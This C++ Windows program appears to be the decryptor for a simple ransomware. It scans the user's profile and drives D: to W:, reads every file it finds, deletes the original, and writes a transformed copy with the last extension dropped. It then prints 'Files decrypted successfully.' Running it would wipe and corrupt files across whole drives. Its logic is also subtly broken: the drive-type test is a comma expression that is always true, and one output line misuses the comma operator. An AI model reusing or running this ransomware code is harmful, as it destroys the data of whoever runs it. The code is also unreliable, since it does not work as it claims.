#define WIN32_LEAN_AND_MEAN
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
FILE* INPUT_FILE;
FILE* OUTPUT_FILE;


bool find(const std::string& myString, const std::string& subString)
{
    return
        (myString.substr(0, subString.size()) == subString) ||
        (subString.size() < myString.size() && find(myString.substr(1), subString));
}

void CryptFile(std::string Path) {
    std::string FileBuffer = "";
    std::ifstream InputFile(Path);
    std::ofstream file;
    if (!InputFile.eof()) {
        std::getline(InputFile, FileBuffer, '\0');
    }
    InputFile.close();
    int FileKey = FileBuffer[0] - (int)'a';
    DeleteFileA(Path.c_str());

    std::string::size_type pos = std::string(Path).find_last_of(".");
    std::string NewPath = std::string(Path).substr(0, pos);
    file.open(NewPath);
    for (int i = 2; i < FileBuffer.size(); i++) {
        if ((int)FileBuffer[i] % 2 == 0) {
            file << (char)((int)FileBuffer[i] / FileKey);
        }
        else {
            file << (char)(OUTPUT_FILE, "%s", (int)FileBuffer[i] - FileKey);
        }
    }
    file.close();
}


void TraverseDir(std::string Path) {
    LPCSTR Extensions[] = { ".txt",".png",".jpg",".pdf",".bmp",".rtf",".doc",".gif" };
    WIN32_FIND_DATAA data;
    HANDLE sh = NULL;
    sh = FindFirstFileA((Path + "\\*").c_str(), &data);
    if (sh == INVALID_HANDLE_VALUE)
    {
        return;
    }
    do
    {
        if (std::string(data.cFileName).compare(".") != 0 && std::string(data.cFileName).compare("..") != 0)
        {
            if ((data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY)
            {
                if (!find(data.cFileName, ".")) {
                    TraverseDir(Path + "\\" + data.cFileName);
                }
            }
            else
            {
#ifdef CheckExtension
                for (int j = 0; j < sizeof(Extensions) / sizeof(Extensions[0]); j++) {
                    if (find(data.cFileName, Extensions[j]) == true) {
                        CryptFile(Path + "\\" + data.cFileName);

                    }
                }
#else
                CryptFile(Path + "\\" + data.cFileName);
#endif
            }
        }
    } while (FindNextFileA(sh, &data)); // do
    FindClose(sh);
}


void main() {
    DWORD Size = 1024;
    char UserName[1024 + 1];
    GetUserNameA(UserName, &Size);
    std::string CDrive = "C:\\Users\\";
    CDrive += UserName;
    LPCSTR Drives[] = { "C:\\","D:\\","E:\\","F:\\","G:\\","U:\\","K:\\","V:\\","W:\\","H:\\","J:\\" };
    for (int i = 0; i < sizeof(Drives) / sizeof(Drives[0]); i++) {
        if (GetDriveTypeA(Drives[i]) != DRIVE_UNKNOWN, DRIVE_NO_ROOT_DIR, DRIVE_RAMDISK) {
            if (i > 0) {
                TraverseDir(Drives[i]);
            }
            else {
                TraverseDir(CDrive);
            }
        }
    }

	std::cout << "Files decrypted successfully." << std::endl;
	Sleep(5000);
	exit(1);
}
